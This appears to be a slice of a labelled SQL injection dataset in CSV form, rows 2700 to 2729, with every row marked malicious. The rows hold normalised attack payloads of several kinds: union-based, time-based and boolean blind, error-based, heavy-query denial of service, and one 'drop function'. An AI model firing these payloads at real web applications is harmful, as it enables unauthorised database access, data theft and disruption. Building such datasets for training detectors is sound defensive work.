row_index,payload_norm,label,sqli_type_hint
2700,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",1,
2701,"1 ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
2702,"1"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""czvm"" like ""czvm",1,
2703,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( 'ahjo' = 'ahjo",1,
2704,-3044' ) or 4999 = 3051#,1,
2705,"1%"" ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""%"" = """,1,
2706,if ( 4735 = 8907 ) select 4735 else drop function qigo--,1,
2707,"1 ) ) as cbdx where 8998 = 8998 and elt ( 4249 = 4249,7259 ) --",1,
2708,"1 where 5485 = 5485 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
2709,select pg_sleep ( 5 ) and 'rpka' = 'rpka,1,
2710,"1"" ) as esks where 1138 = 1138",1,
2711,"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'cipk' = 'cipk",1,
2712,-1700%' or 4149 = 3391#,1,
2713,select ( case when ( 9619 = 8679 ) then 1 else 9619* ( select 9619 from master..sysdatabases ) end ) --,1,
2714,1' in boolean mode ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
2715,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( '%' = '",1,
2716,-1621' in boolean mode ) order by 1--,1,
2717,"1"" ) as mibc where 3113 = 3113",1,
2718,select ( case when ( 5290 = 1720 ) then 5290 else 1/ ( select 0 ) end ) --,1,
2719,"1%"" ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""%"" = """,1,
2720,"1%' ) ) ) union all select null,null#",1,
2721,"select sleep ( 5 ) and ( ( ""vzye"" = ""vzye",1,
2722,-9739' or 8571 = 8571--,1,
2723,1'|| ( select 'exls' where 3837 = 3837 and sleep ( 5 ) ) ||',1,
2724,1%' ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
2725,1 ) where 7159 = 7159,1,
2726,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ""avyw"" = ""avyw",1,
2727,"1' ) ) as omwk where 1414 = 1414 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1,
2728,"-9179"" ) union all select 7144,7144,7144,7144,7144,7144,7144,7144--",1,
2729,"1' ) ) as wkys where 2478 = 2478 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,
